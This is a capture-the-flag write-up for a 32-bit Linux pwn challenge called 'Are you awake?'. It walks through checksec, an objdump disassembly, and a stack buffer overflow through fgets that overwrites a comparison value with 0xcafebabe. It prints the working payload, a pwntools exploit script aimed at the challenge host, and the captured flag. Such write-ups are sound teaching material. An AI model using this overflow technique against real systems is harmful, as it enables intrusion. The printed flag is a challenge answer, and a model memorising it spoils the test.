Are you awake?
20

Are you awake?

nc areyouawake.chals.fuzzy.land 5503


Solution
========

First of all, let's analyze the binary file:
```
$ file awake
awake: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=759b6f50dbea9e6924bab76a7add1c4bf121e5c2, not stripped
```
```
$ checksec awake
[*] 'awake'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
It's a 32bit Linux ELF binary with stack protection disabled ("No canary found")
but with a non-executbale stack ("NX enabled"). Furthermore the file is
little-endian ("LSB executable"). That's already some usefull
information, so let's now find out what the program does. We execute the program and enter ```yes```:

```
$ nc areyouawake.chals.fuzzy.land 5503
```
```
Are you awake? yes
Nope, you are still sleeping! (0xdeadbeef)
😴
```
The program gives us a hint: ```(0xdeadbeef)```.
Obviously there's a variable which stores the value ```0xdeadbeef``` which we
might have to change to some specific value in order to get the flag. Since we
don't have the source code available, we have to disassemble the binary:

```
$ objdump -d awake
```
```
0804854b <check_awake>:
 804854b:	55                   	push   %ebp
 804854c:	89 e5                	mov    %esp,%ebp
 804854e:	83 ec 08             	sub    $0x8,%esp
 8048551:	83 ec 0c             	sub    $0xc,%esp
 8048554:	68 d0 86 04 08       	push   $0x80486d0
 8048559:	e8 72 fe ff ff       	call   80483d0 <printf@plt>
 804855e:	83 c4 10             	add    $0x10,%esp
 8048561:	a1 40 a0 04 08       	mov    0x804a040,%eax
 8048566:	83 ec 04             	sub    $0x4,%esp
 8048569:	50                   	push   %eax
 804856a:	68 28 01 00 00       	push   $0x128
 804856f:	ff 75 08             	pushl  0x8(%ebp)
 8048572:	e8 69 fe ff ff       	call   80483e0 <fgets@plt>
 8048577:	83 c4 10             	add    $0x10,%esp
 804857a:	90                   	nop
 804857b:	c9                   	leave
 804857c:	c3                   	ret

0804857d <func>:
 804857d:	55                   	push   %ebp
 804857e:	89 e5                	mov    %esp,%ebp
 8048580:	81 ec 88 00 00 00    	sub    $0x88,%esp
 8048586:	83 ec 08             	sub    $0x8,%esp
 8048589:	68 28 01 00 00       	push   $0x128
 804858e:	8d 85 78 ff ff ff    	lea    -0x88(%ebp),%eax
 8048594:	50                   	push   %eax
 8048595:	e8 b1 ff ff ff       	call   804854b <check_awake>
 804859a:	83 c4 10             	add    $0x10,%esp
 804859d:	8b 45 08             	mov    0x8(%ebp),%eax
 80485a0:	3d be ba fe ca       	cmp    $0xcafebabe,%eax
 80485a5:	75 2a                	jne    80485d1 <func+0x54>
 80485a7:	83 ec 0c             	sub    $0xc,%esp
 80485aa:	68 e0 86 04 08       	push   $0x80486e0
 80485af:	e8 3c fe ff ff       	call   80483f0 <puts@plt>
 80485b4:	83 c4 10             	add    $0x10,%esp
 80485b7:	83 ec 0c             	sub    $0xc,%esp
 80485ba:	68 29 87 04 08       	push   $0x8048729
 80485bf:	e8 3c fe ff ff       	call   8048400 <system@plt>
 80485c4:	83 c4 10             	add    $0x10,%esp
 80485c7:	83 ec 0c             	sub    $0xc,%esp
 80485ca:	6a 01                	push   $0x1
 80485cc:	e8 3f fe ff ff       	call   8048410 <exit@plt>
 80485d1:	8b 45 08             	mov    0x8(%ebp),%eax
 80485d4:	83 ec 08             	sub    $0x8,%esp
 80485d7:	50                   	push   %eax
 80485d8:	68 38 87 04 08       	push   $0x8048738
 80485dd:	e8 ee fd ff ff       	call   80483d0 <printf@plt>
 80485e2:	83 c4 10             	add    $0x10,%esp
 80485e5:	83 ec 0c             	sub    $0xc,%esp
 80485e8:	68 5e 87 04 08       	push   $0x804875e
 80485ed:	e8 fe fd ff ff       	call   80483f0 <puts@plt>
 80485f2:	83 c4 10             	add    $0x10,%esp
 80485f5:	83 ec 0c             	sub    $0xc,%esp
 80485f8:	6a 00                	push   $0x0
 80485fa:	e8 11 fe ff ff       	call   8048410 <exit@plt>

080485ff <main>:
 80485ff:	8d 4c 24 04          	lea    0x4(%esp),%ecx
 8048603:	83 e4 f0             	and    $0xfffffff0,%esp
 8048606:	ff 71 fc             	pushl  -0x4(%ecx)
 8048609:	55                   	push   %ebp
 804860a:	89 e5                	mov    %esp,%ebp
 804860c:	51                   	push   %ecx
 804860d:	83 ec 04             	sub    $0x4,%esp
 8048610:	a1 44 a0 04 08       	mov    0x804a044,%eax
 8048615:	6a 00                	push   $0x0
 8048617:	6a 02                	push   $0x2
 8048619:	6a 00                	push   $0x0
 804861b:	50                   	push   %eax
 804861c:	e8 0f fe ff ff       	call   8048430 <setvbuf@plt>
 8048621:	83 c4 10             	add    $0x10,%esp
 8048624:	83 ec 0c             	sub    $0xc,%esp
 8048627:	68 ef be ad de       	push   $0xdeadbeef
 804862c:	e8 4c ff ff ff       	call   804857d <func>
 8048631:	83 c4 10             	add    $0x10,%esp
 8048634:	b8 00 00 00 00       	mov    $0x0,%eax
 8048639:	8b 4d fc             	mov    -0x4(%ebp),%ecx
 804863c:	c9                   	leave
 804863d:	8d 61 fc             	lea    -0x4(%ecx),%esp
 8048640:	c3                   	ret
 8048641:	66 90                	xchg   %ax,%ax
 8048643:	66 90                	xchg   %ax,%ax
 8048645:	66 90                	xchg   %ax,%ax
 8048647:	66 90                	xchg   %ax,%ax
 8048649:	66 90                	xchg   %ax,%ax
 804864b:	66 90                	xchg   %ax,%ax
 804864d:	66 90                	xchg   %ax,%ax
 804864f:	90                   	nop
 ```
In the disassembly of ```<main>``` we can see a function call to ```<func>``` with one
function argument: ```0xdeadbeef```:
```
8048627:	68 ef be ad de       	push   $0xdeadbeef
804862c:	e8 4c ff ff ff       	call   804857d <func>
```

The disassembly of ```<func>``` tells us, that the function argument (in this particular case it's 0xdeadbeef) is then compared with the hard coded value 0xcafebabe:
```
...
80485a0:	3d be ba fe ca       	cmp    $0xcafebabe,%eax
...
```
Let's see if we can change the variable's content from 0xdeadbeef to something
else:
```
$ python -c 'print "A"*142' | nc areyouawake.chals.fuzzy.land 5503
Are you awake? Nope, you are still sleeping! (0xdeadbeef)
😴
```
Hm, nothing happened so far. But what if we add another A to the payload?
```
$ python -c 'print "A"*143' | nc areyouawake.chals.fuzzy.land 5503
Are you awake? Nope, you are still sleeping! (0xdeadbe00)
😴
```
Here we go! We just successfully modified the value from ```0xdeadbeef``` to ```0xdeadbe00```. That's most likely caused by the [NULL termination](https://stackoverflow.com/questions/2037209/what-is-a-null-terminated-string) of the C library function ```fgets()``` which reads in our input. The call to function ```fgets()``` can be found in the disassembly of the function ```<check_awake>```...
```
 8048572:	e8 69 fe ff ff       	call   80483e0 <fgets@plt>
 ```
...which in turn is called within function ```<func>```:
```
 8048595:	e8 b1 ff ff ff       	call   804854b <check_awake>
```
So let's continue to add some more A's to our payload:
```
$ python -c 'print "A"*144' | nc areyouawake.chals.fuzzy.land 5503
Are you awake? Nope, you are still sleeping! (0xdead000a)
😴
$ python -c 'print "A"*145' | nc areyouawake.chals.fuzzy.land 5503
Are you awake? Nope, you are still sleeping! (0xde000a41)
😴
$ python -c 'print "A"*146' | nc areyouawake.chals.fuzzy.land 5503
Are you awake? Nope, you are still sleeping! (0xa4141)
😴
$ python -c 'print "A"*147' | nc areyouawake.chals.fuzzy.land 5503
Are you awake? Nope, you are still sleeping! (0xa414141)
😴
$ python -c 'print "A"*148' | nc areyouawake.chals.fuzzy.land 5503
Are you awake? Nope, you are still sleeping! (0x41414141)
😴
```
Now we have completely overwritten the variable and therefore replaced the value ```0xdeadbeef``` with our A's which are represented by the ASCII hex code ```0x41```. 

In the beginning we found out that the binary is 32 bit. 8 bits are 1 byte. And each one of our A's is 1 byte as well. Therefore 4 A's form a 32 bit address. 
In order to get the flag, all we have to do is to replace ```0x41414141``` with the previously gathered value ```0xcafebabe```. As mentioned earlier, the binary is little-endian. Therefore we have to store the 4 bytes in reverse order. So ```0xca``` ```0xfe``` ```0xba``` ```0xbe``` becomes ```0xbe``` ```0xba``` ```0xfe``` ```0xca```:
```
$ python -c 'print "A"*144 + "\xbe\xba\xfe\xca"' | nc areyouawake.chals.fuzzy.land 5503
Are you awake? Oh, good morning :)
What better way to start the day than with a flag ;)
LosCTF{s0me_s4y_y0u_c0uldve_d0ne_th1s_wh1le_sl33p1ng}
```
This can even be simplified by using the [packing](http://docs.pwntools.com/en/stable/util/packing.html#module-pwnlib.util.packing) function of the so-called [pwntools](https://github.com/Gallopsled/pwntools) Python library:
```
#!/usr/bin/python

import pwn
import struct

p = pwn.remote( "areyouawake.chals.fuzzy.land", 5503 )
#p = pwn.process( "./awake" )

payload = "A" * 144
payload += pwn.p32( 0xcafebabe )

print( p.recv() )
p.sendline( payload )
print( p.recv() )
print( p.recv() )
```
```
$ python exploit.py
[+] Opening connection to areyouawake.chals.fuzzy.land on port 5503: Done
Are you awake?
Oh, good morning :)
What better way to start the day than with a flag ;)

LosCTF{s0me_s4y_y0u_c0uldve_d0ne_th1s_wh1le_sl33p1ng}

[*] Closed connection to areyouawake.chals.fuzzy.land port 5503
```
That's it.
